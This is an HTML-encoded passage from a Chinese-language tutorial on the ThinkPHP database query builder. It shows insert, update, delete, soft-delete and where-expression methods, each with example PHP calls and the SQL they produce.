<pre><code>$data = [&apos;foo&apos; =&gt; &apos;bar&apos;, &apos;bar&apos; =&gt; &apos;foo&apos;];
Db::name(&apos;user&apos;)-&gt;save($data);
</code></pre><p>&#x6216;&#x8005;&#x4F7F;&#x7528; <code>insert</code> &#x65B9;&#x6CD5;&#x5411;&#x6570;&#x636E;&#x5E93;&#x63D0;&#x4EA4;&#x6570;&#x636E;</p>
<pre><code>$data = [&apos;foo&apos; =&gt; &apos;bar&apos;, &apos;bar&apos; =&gt; &apos;foo&apos;];
Db::name(&apos;user&apos;)-&gt;insert($data);
</code></pre><blockquote>
<p><code>insert</code> &#x65B9;&#x6CD5;&#x6DFB;&#x52A0;&#x6570;&#x636E;&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x6DFB;&#x52A0;&#x6210;&#x529F;&#x7684;&#x6761;&#x6570;&#xFF0C;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x8FD4;&#x56DE; 1</p>
<p>&#x5982;&#x679C;&#x4F60;&#x7684;&#x6570;&#x636E;&#x8868;&#x91CC;&#x9762;&#x6CA1;&#x6709;<code>foo</code>&#x6216;&#x8005;<code>bar</code>&#x5B57;&#x6BB5;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;</p>
</blockquote>
<p>&#x5982;&#x679C;&#x4E0D;&#x5E0C;&#x671B;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
<pre><code>$data = [&apos;foo&apos; =&gt; &apos;bar&apos;, &apos;bar&apos; =&gt; &apos;foo&apos;];
Db::name(&apos;user&apos;)-&gt;strict(false)-&gt;insert($data);
</code></pre><p>&#x4E0D;&#x5B58;&#x5728;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x5C06;&#x4F1A;&#x76F4;&#x63A5;&#x629B;&#x5F03;&#x3002;</p>
<p>&#x5982;&#x679C;&#x662F;mysql&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x652F;&#x6301;<code>replace</code>&#x5199;&#x5165;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>$data = [&apos;foo&apos; =&gt; &apos;bar&apos;, &apos;bar&apos; =&gt; &apos;foo&apos;];
Db::name(&apos;user&apos;)-&gt;replace()-&gt;insert($data);
</code></pre><p>&#x6DFB;&#x52A0;&#x6570;&#x636E;&#x540E;&#x5982;&#x679C;&#x9700;&#x8981;&#x8FD4;&#x56DE;&#x65B0;&#x589E;&#x6570;&#x636E;&#x7684;&#x81EA;&#x589E;&#x4E3B;&#x952E;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>insertGetId</code>&#x65B9;&#x6CD5;&#x65B0;&#x589E;&#x6570;&#x636E;&#x5E76;&#x8FD4;&#x56DE;&#x4E3B;&#x952E;&#x503C;&#xFF1A;</p>
<pre><code>$userId = Db::name(&apos;user&apos;)-&gt;insertGetId($data);
</code></pre><blockquote>
<p><code>insertGetId</code> &#x65B9;&#x6CD5;&#x6DFB;&#x52A0;&#x6570;&#x636E;&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x6DFB;&#x52A0;&#x6570;&#x636E;&#x7684;&#x81EA;&#x589E;&#x4E3B;&#x952E;</p>
</blockquote>
<h6 id="&#x6DFB;&#x52A0;&#x591A;&#x6761;&#x6570;&#x636E;">&#x6DFB;&#x52A0;&#x591A;&#x6761;&#x6570;&#x636E;</h6>
<p>&#x6DFB;&#x52A0;&#x591A;&#x6761;&#x6570;&#x636E;&#x76F4;&#x63A5;&#x5411; Db &#x7C7B;&#x7684; <code>insertAll</code> &#x65B9;&#x6CD5;&#x4F20;&#x5165;&#x9700;&#x8981;&#x6DFB;&#x52A0;&#x7684;&#x6570;&#x636E;&#xFF08;&#x901A;&#x5E38;&#x662F;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#xFF09;&#x5373;&#x53EF;&#x3002;</p>
<pre><code>$data = [
    [&apos;foo&apos; =&gt; &apos;bar&apos;, &apos;bar&apos; =&gt; &apos;foo&apos;],
    [&apos;foo&apos; =&gt; &apos;bar1&apos;, &apos;bar&apos; =&gt; &apos;foo1&apos;],
    [&apos;foo&apos; =&gt; &apos;bar2&apos;, &apos;bar&apos; =&gt; &apos;foo2&apos;]
];
Db::name(&apos;user&apos;)-&gt;insertAll($data);
</code></pre><blockquote>
<p><code>insertAll</code>&#x65B9;&#x6CD5;&#x6DFB;&#x52A0;&#x6570;&#x636E;&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x6DFB;&#x52A0;&#x6210;&#x529F;&#x7684;&#x6761;&#x6570;</p>
</blockquote>
<p>&#x5982;&#x679C;&#x662F;mysql&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x652F;&#x6301;<code>replace</code>&#x5199;&#x5165;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>$data = [
    [&apos;foo&apos; =&gt; &apos;bar&apos;, &apos;bar&apos; =&gt; &apos;foo&apos;],
    [&apos;foo&apos; =&gt; &apos;bar1&apos;, &apos;bar&apos; =&gt; &apos;foo1&apos;],
    [&apos;foo&apos; =&gt; &apos;bar2&apos;, &apos;bar&apos; =&gt; &apos;foo2&apos;]
];
Db::name(&apos;user&apos;)-&gt;replace()-&gt;insertAll($data);
</code></pre><blockquote>
<p>&#x786E;&#x4FDD;&#x8981;&#x6279;&#x91CF;&#x6DFB;&#x52A0;&#x7684;&#x6570;&#x636E;&#x5B57;&#x6BB5;&#x662F;&#x4E00;&#x81F4;&#x7684;</p>
</blockquote>
<p>&#x5982;&#x679C;&#x6279;&#x91CF;&#x63D2;&#x5165;&#x7684;&#x6570;&#x636E;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5206;&#x6279;&#x63D2;&#x5165;&#xFF0C;&#x4F7F;&#x7528;<code>limit</code>&#x65B9;&#x6CD5;&#x6307;&#x5B9A;&#x6BCF;&#x6B21;&#x63D2;&#x5165;&#x7684;&#x6570;&#x91CF;&#x9650;&#x5236;&#x3002;</p>
<pre><code>$data = [
    [&apos;foo&apos; =&gt; &apos;bar&apos;, &apos;bar&apos; =&gt; &apos;foo&apos;],
    [&apos;foo&apos; =&gt; &apos;bar1&apos;, &apos;bar&apos; =&gt; &apos;foo1&apos;],
    [&apos;foo&apos; =&gt; &apos;bar2&apos;, &apos;bar&apos; =&gt; &apos;foo2&apos;]
    ...
];
// &#x5206;&#x6279;&#x5199;&#x5165; &#x6BCF;&#x6B21;&#x6700;&#x591A;100&#x6761;&#x6570;&#x636E;
Db::name(&apos;user&apos;)
    -&gt;limit(100)
    -&gt;insertAll($data);
</code></pre><h3 id="&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FEE;&#x6539;&#x5220;&#x9664;">&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FEE;&#x6539;&#x5220;&#x9664;</h3>
<h5 id="&#x66F4;&#x65B0;&#x6570;&#x636E;">&#x66F4;&#x65B0;&#x6570;&#x636E;</h5>
<p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;save&#x65B9;&#x6CD5;&#x66F4;&#x65B0;&#x6570;&#x636E;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;save([&apos;id&apos; =&gt; 1, &apos;name&apos; =&gt; &apos;thinkphp&apos;]);
</code></pre><p>&#x6216;&#x8005;&#x4F7F;&#x7528;<code>update</code>&#x65B9;&#x6CD5;&#x3002;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;update([&apos;name&apos; =&gt; &apos;thinkphp&apos;]);
</code></pre><p>&#x5B9E;&#x9645;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x53EF;&#x80FD;&#x662F;&#xFF1A;</p>
<pre><code>UPDATE `think_user`  SET `name`=&apos;thinkphp&apos;  WHERE  `id` = 1
</code></pre><blockquote>
<p><code>update</code>&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x5F71;&#x54CD;&#x6570;&#x636E;&#x7684;&#x6761;&#x6570;&#xFF0C;&#x6CA1;&#x4FEE;&#x6539;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x8FD4;&#x56DE; 0</p>
</blockquote>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/cf69f1b73fff340d8db38f811c9f2738.png" alt="cf69f1b73fff340d8db38f811c9f2738.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/ac0da3275c4107d02912ec3f8d7bef5b.png" alt="ac0da3275c4107d02912ec3f8d7bef5b.png"></p>
<p>&#x652F;&#x6301;&#x4F7F;&#x7528;<code>data</code>&#x65B9;&#x6CD5;&#x4F20;&#x5165;&#x8981;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;data([&apos;name&apos; =&gt; &apos;thinkphp&apos;])
    -&gt;update();
</code></pre><blockquote>
<p>&#x5982;&#x679C;<code>update</code>&#x65B9;&#x6CD5;&#x548C;<code>data</code>&#x65B9;&#x6CD5;&#x540C;&#x65F6;&#x4F20;&#x5165;&#x66F4;&#x65B0;&#x6570;&#x636E;&#xFF0C;&#x5219;&#x4EE5;<code>update</code>&#x65B9;&#x6CD5;&#x4E3A;&#x51C6;&#x3002;</p>
</blockquote>
<p>&#x5982;&#x679C;&#x6570;&#x636E;&#x4E2D;&#x5305;&#x542B;&#x4E3B;&#x952E;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;update([&apos;name&apos; =&gt; &apos;thinkphp&apos;,&apos;id&apos; =&gt; 1]);
</code></pre><p>&#x5B9E;&#x9645;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x548C;&#x524D;&#x9762;&#x7528;&#x6CD5;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF1A;</p>
<pre><code>UPDATE `think_user`  SET `name`=&apos;thinkphp&apos;  WHERE  `id` = 1
</code></pre><p>&#x5982;&#x679C;&#x8981;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x9700;&#x8981;&#x4F7F;&#x7528;<code>SQL</code>&#x51FD;&#x6570;&#x6216;&#x8005;&#x5176;&#x5B83;&#x5B57;&#x6BB5;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x5F0F;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;where(&apos;id&apos;,1)
    -&gt;exp(&apos;name&apos;,&apos;UPPER(name)&apos;)
    -&gt;update();
</code></pre><p>&#x5B9E;&#x9645;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#xFF1A;</p>
<pre><code>UPDATE `think_user`  SET `name` = UPPER(name)  WHERE  `id` = 1
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/f1b5f8901f14d47edc1eb1e4674df201.png" alt="f1b5f8901f14d47edc1eb1e4674df201.png"><img src="https://s1.imagehub.cc/images/2023/01/27/c841e367e3aab64c29f59d66c1895685.png" alt="c841e367e3aab64c29f59d66c1895685.png"></p>
<p>&#x652F;&#x6301;&#x4F7F;&#x7528;<code>raw</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x3002;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;update([
        &apos;name&apos;        =&gt;    Db::raw(&apos;UPPER(name)&apos;),
        &apos;score&apos;        =&gt;    Db::raw(&apos;score-3&apos;),
        &apos;read_time&apos;    =&gt;    Db::raw(&apos;read_time+1&apos;)
    ]);
</code></pre><h5 id="&#x81EA;&#x589E;&#x81EA;&#x51CF;">&#x81EA;&#x589E;/&#x81EA;&#x51CF;</h5>
<p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>inc/dec</code>&#x65B9;&#x6CD5;&#x81EA;&#x589E;&#x6216;&#x81EA;&#x51CF;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#xFF08; &#x5982;&#x4E0D;&#x52A0;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x9ED8;&#x8BA4;&#x6B65;&#x957F;&#x4E3A;1&#xFF09;&#x3002;</p>
<pre><code>// score &#x5B57;&#x6BB5;&#x52A0; 1
Db::table(&apos;think_user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;inc(&apos;score&apos;)
    -&gt;update();

// score &#x5B57;&#x6BB5;&#x52A0; 5
Db::table(&apos;think_user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;inc(&apos;score&apos;, 5)
    -&gt;update();

// score &#x5B57;&#x6BB5;&#x51CF; 1
Db::table(&apos;think_user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;dec(&apos;score&apos;)
    -&gt;update();

// score &#x5B57;&#x6BB5;&#x51CF; 5
Db::table(&apos;think_user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;dec(&apos;score&apos;, 5)
    -&gt;update();
</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x53EF;&#x80FD;&#x662F;&#xFF1A;</p>
<pre><code>UPDATE `think_user`  SET `score` = `score` + 1  WHERE  `id` = 1 
UPDATE `think_user`  SET `score` = `score` + 5  WHERE  `id` = 1
UPDATE `think_user`  SET `score` = `score` - 1  WHERE  `id` = 1
UPDATE `think_user`  SET `score` = `score` - 5  WHERE  `id` = 1
</code></pre><h5 id="&#x5220;&#x9664;&#x6570;&#x636E;">&#x5220;&#x9664;&#x6570;&#x636E;</h5>
<pre><code>// &#x6839;&#x636E;&#x4E3B;&#x952E;&#x5220;&#x9664;
Db::table(&apos;think_user&apos;)-&gt;delete(1);
Db::table(&apos;think_user&apos;)-&gt;delete([1,2,3]);

// &#x6761;&#x4EF6;&#x5220;&#x9664;    
Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;,1)-&gt;delete();
Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;,&apos;&lt;&apos;,10)-&gt;delete();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/75fdf4123205e56d81320ab1b8dc232a.png" alt="75fdf4123205e56d81320ab1b8dc232a.png"><img src="https://s1.imagehub.cc/images/2023/01/27/fc34035f6d9e4907ba627f81541ca782.png" alt="fc34035f6d9e4907ba627f81541ca782.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/e5dcf0a82914a4fab74ea6099788d41e.png" alt="e5dcf0a82914a4fab74ea6099788d41e.png"></p>
<p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x53EF;&#x80FD;&#x662F;&#xFF1A;</p>
<pre><code>DELETE FROM `think_user` WHERE  `id` = 1 
DELETE FROM `think_user` WHERE  `id` IN (1,2,3) 
DELETE FROM `think_user` WHERE  `id` = 1 
DELETE FROM `think_user` WHERE  `id` &lt; 10
</code></pre><blockquote>
<p><code>delete</code>&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x5F71;&#x54CD;&#x6570;&#x636E;&#x7684;&#x6761;&#x6570;&#xFF0C;&#x6CA1;&#x6709;&#x5220;&#x9664;&#x8FD4;&#x56DE; 0</p>
</blockquote>
<p>&#x5982;&#x679C;&#x4E0D;&#x5E26;&#x4EFB;&#x4F55;&#x6761;&#x4EF6;&#x8C03;&#x7528;<code>delete</code>&#x65B9;&#x6CD5;&#x4F1A;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x786E;&#x5B9E;&#x9700;&#x8981;&#x5220;&#x9664;&#x6240;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>// &#x65E0;&#x6761;&#x4EF6;&#x5220;&#x9664;&#x6240;&#x6709;&#x6570;&#x636E;
Db::name(&apos;user&apos;)-&gt;delete(true);
</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF08;&#x5220;&#x9664;&#x4E86;&#x8868;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#xFF09;&#xFF1A;</p>
<pre><code>DELETE FROM `think_user`
</code></pre><blockquote>
<p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x4E0D;&#x5EFA;&#x8BAE;&#x771F;&#x5B9E;&#x5220;&#x9664;&#x6570;&#x636E;&#xFF0C;&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;&#x4E86;&#x8F6F;&#x5220;&#x9664;&#x673A;&#x5236;&#xFF08;&#x6A21;&#x578B;&#x4E2D;&#x4F7F;&#x7528;&#x8F6F;&#x5220;&#x9664;&#x66F4;&#x4E3A;&#x65B9;&#x4FBF;&#xFF09;&#x3002;</p>
</blockquote>
<pre><code>// &#x8F6F;&#x5220;&#x9664;&#x6570;&#x636E; &#x4F7F;&#x7528;delete_time&#x5B57;&#x6BB5;&#x6807;&#x8BB0;&#x5220;&#x9664;
Db::name(&apos;user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;useSoftDelete(&apos;delete_time&apos;,time())
    -&gt;delete();
</code></pre><p>&#x5B9E;&#x9645;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x53EF;&#x80FD;&#x5982;&#x4E0B;&#xFF08;&#x6267;&#x884C;&#x7684;&#x662F;<code>UPDATE</code>&#x64CD;&#x4F5C;&#xFF09;&#xFF1A;</p>
<pre><code>UPDATE `think_user`  SET `delete_time` = &apos;1515745214&apos;  WHERE  `id` = 1
</code></pre><p><code>useSoftDelete</code>&#x65B9;&#x6CD5;&#x8868;&#x793A;&#x4F7F;&#x7528;&#x8F6F;&#x5220;&#x9664;&#xFF0C;&#x5E76;&#x4E14;&#x6307;&#x5B9A;&#x8F6F;&#x5220;&#x9664;&#x5B57;&#x6BB5;&#x4E3A;<code>delete_time</code>&#xFF0C;&#x5199;&#x5165;&#x6570;&#x636E;&#x4E3A;&#x5F53;&#x524D;&#x7684;&#x65F6;&#x95F4;&#x6233;&#x3002;</p>
<h3 id="&#x6570;&#x636E;&#x5E93;&#x7684;&#x67E5;&#x8BE2;&#x8868;&#x8FBE;&#x5F0F;">&#x6570;&#x636E;&#x5E93;&#x7684;&#x67E5;&#x8BE2;&#x8868;&#x8FBE;&#x5F0F;</h3>
<p>&#x67E5;&#x8BE2;&#x8868;&#x8FBE;&#x5F0F;&#x652F;&#x6301;&#x5927;&#x90E8;&#x5206;&#x7684;SQL&#x67E5;&#x8BE2;&#x8BED;&#x6CD5;&#xFF0C;&#x4E5F;&#x662F;<code>ThinkPHP</code>&#x67E5;&#x8BE2;&#x8BED;&#x8A00;&#x7684;&#x7CBE;&#x9AD3;&#xFF0C;&#x67E5;&#x8BE2;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x4F7F;&#x7528;&#x683C;&#x5F0F;&#xFF1A;</p>
<pre><code>where(&apos;&#x5B57;&#x6BB5;&#x540D;&apos;,&apos;&#x67E5;&#x8BE2;&#x8868;&#x8FBE;&#x5F0F;&apos;,&apos;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&apos;);
</code></pre><p>&#x9664;&#x4E86;<code>where</code>&#x65B9;&#x6CD5;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x652F;&#x6301;<code>whereOr</code>&#xFF0C;&#x7528;&#x6CD5;&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002;&#x4E3A;&#x4E86;&#x66F4;&#x52A0;&#x65B9;&#x4FBF;&#x67E5;&#x8BE2;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x7684;&#x67E5;&#x8BE2;&#x8868;&#x8FBE;&#x5F0F;&#x90FD;&#x63D0;&#x4F9B;&#x4E86;&#x5FEB;&#x6377;&#x67E5;&#x8BE2;&#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x8868;&#x8FBE;&#x5F0F;&#x4E0D;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x652F;&#x6301;&#x7684;&#x67E5;&#x8BE2;&#x8868;&#x8FBE;&#x5F0F;&#x6709;&#x4E0B;&#x9762;&#x51E0;&#x79CD;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x8868;&#x8FBE;&#x5F0F;</th>
<th style="text-align:left">&#x542B;&#x4E49;</th>
<th style="text-align:left">&#x5FEB;&#x6377;&#x67E5;&#x8BE2;&#x65B9;&#x6CD5;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">=</td>
<td style="text-align:left">&#x7B49;&#x4E8E;</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">&lt;&gt;</td>
<td style="text-align:left">&#x4E0D;&#x7B49;&#x4E8E;</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">&gt;</td>
<td style="text-align:left">&#x5927;&#x4E8E;</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">&gt;=</td>
<td style="text-align:left">&#x5927;&#x4E8E;&#x7B49;&#x4E8E;</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">&lt;</td>
<td style="text-align:left">&#x5C0F;&#x4E8E;</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">&lt;=</td>
<td style="text-align:left">&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">[NOT] LIKE</td>
<td style="text-align:left">&#x6A21;&#x7CCA;&#x67E5;&#x8BE2;</td>
<td style="text-align:left"><code>whereLike/whereNotLike</code></td>
</tr>
<tr>
<td style="text-align:left">[NOT] BETWEEN</td>
<td style="text-align:left">&#xFF08;&#x4E0D;&#x5728;&#xFF09;&#x533A;&#x95F4;&#x67E5;&#x8BE2;</td>
<td style="text-align:left"><code>whereBetween/whereNotBetween</code></td>
</tr>
<tr>
<td style="text-align:left">[NOT] IN</td>
<td style="text-align:left">&#xFF08;&#x4E0D;&#x5728;&#xFF09;IN &#x67E5;&#x8BE2;</td>
<td style="text-align:left"><code>whereIn/whereNotIn</code></td>
</tr>
<tr>
<td style="text-align:left">[NOT] NULL</td>
<td style="text-align:left">&#x67E5;&#x8BE2;&#x5B57;&#x6BB5;&#x662F;&#x5426;&#xFF08;&#x4E0D;&#xFF09;&#x662F;NULL</td>
<td style="text-align:left"><code>whereNull/whereNotNull</code></td>
</tr>
<tr>
<td style="text-align:left">[NOT] EXISTS</td>
<td style="text-align:left">EXISTS&#x67E5;&#x8BE2;</td>
<td style="text-align:left"><code>whereExists/whereNotExists</code></td>
</tr>
<tr>
<td style="text-align:left">[NOT] REGEXP</td>
<td style="text-align:left">&#x6B63;&#x5219;&#xFF08;&#x4E0D;&#xFF09;&#x5339;&#x914D;&#x67E5;&#x8BE2;&#xFF08;&#x4EC5;&#x652F;&#x6301;Mysql&#xFF09;</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">[NOT] BETWEEN TIME</td>
<td style="text-align:left">&#x65F6;&#x95F4;&#x533A;&#x95F4;&#x6BD4;&#x8F83;</td>
<td style="text-align:left">whereBetweenTime</td>
</tr>
<tr>
<td style="text-align:left">&gt; TIME</td>
<td style="text-align:left">&#x5927;&#x4E8E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;</td>
<td style="text-align:left"><code>whereTime</code></td>
</tr>
<tr>
<td style="text-align:left">&lt; TIME</td>
<td style="text-align:left">&#x5C0F;&#x4E8E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;</td>
<td style="text-align:left"><code>whereTime</code></td>
</tr>
<tr>
<td style="text-align:left">&gt;= TIME</td>
<td style="text-align:left">&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;</td>
<td style="text-align:left"><code>whereTime</code></td>
</tr>
<tr>
<td style="text-align:left">&lt;= TIME</td>
<td style="text-align:left">&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;</td>
<td style="text-align:left"><code>whereTime</code></td>
</tr>
<tr>
<td style="text-align:left">EXP</td>
<td style="text-align:left">&#x8868;&#x8FBE;&#x5F0F;&#x67E5;&#x8BE2;&#xFF0C;&#x652F;&#x6301;SQL&#x8BED;&#x6CD5;</td>
<td style="text-align:left"><code>whereExp</code></td>
</tr>
<tr>
<td style="text-align:left">find in set</td>
<td style="text-align:left">FIND_IN_SET&#x67E5;&#x8BE2;</td>
<td style="text-align:left"><code>whereFindInSet</code></td>
</tr>
</tbody>
</table>
<p>&#x8868;&#x8FBE;&#x5F0F;&#x67E5;&#x8BE2;&#x7684;&#x7528;&#x6CD5;&#x793A;&#x4F8B;&#x5982;&#x4E0B;&#xFF1A;</p>
<h4 id="&#x7B49;&#x4E8E;&#xFF08;&#xFF09;">&#x7B49;&#x4E8E;&#xFF08;=&#xFF09;</h4>
<p>&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;=&apos;,100)-&gt;select();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/8a422e35734902dee84ceef68aa27db0.png" alt="8a422e35734902dee84ceef68aa27db0.png"><img src="https://s1.imagehub.cc/images/2023/01/27/13396856578b56df517626c8e2ca93fc.png" alt="13396856578b56df517626c8e2ca93fc.png"></p>
<p>&#x548C;&#x4E0B;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#x7B49;&#x6548;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,100)-&gt;select();
</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `id` = 100
</code></pre><h4 id="&#x4E0D;&#x7B49;&#x4E8E;&#xFF08;&#xFF09;">&#x4E0D;&#x7B49;&#x4E8E;&#xFF08;&lt;&gt;&#xFF09;</h4>
<p>&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;&lt;&gt;&apos;,100)-&gt;select();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/352c8d62d47b1edf28588e2d19607ef0.png" alt="352c8d62d47b1edf28588e2d19607ef0.png"><img src="https://s1.imagehub.cc/images/2023/01/27/33240ab027d406e171dfa105a9c32e0c.png" alt="33240ab027d406e171dfa105a9c32e0c.png"></p>
<p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `id` &lt;&gt; 100
</code></pre><h4 id="&#x5927;&#x4E8E;&#xFF08;&#xFF09;">&#x5927;&#x4E8E;&#xFF08;&gt;&#xFF09;</h4>
<p>&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;&gt;&apos;,100)-&gt;select();
</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `id` &gt; 100
</code></pre><h4 id="&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#xFF08;&#xFF09;">&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#xFF08;&gt;=&#xFF09;</h4>
<p>&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;&gt;=&apos;,100)-&gt;select();
</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `id` &gt;= 100
</code></pre><h4 id="&#x5C0F;&#x4E8E;&#xFF08;&#xFF09;">&#x5C0F;&#x4E8E;&#xFF08;&lt;&#xFF09;</h4>
<p>&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;, &apos;&lt;&apos;, 100)-&gt;select();
</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `id` &lt; 100
</code></pre><h4 id="&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#xFF08;&#xFF09;">&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#xFF08;&lt;=&#xFF09;</h4>
<p>&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;, &apos;&lt;=&apos;, 100)-&gt;select();
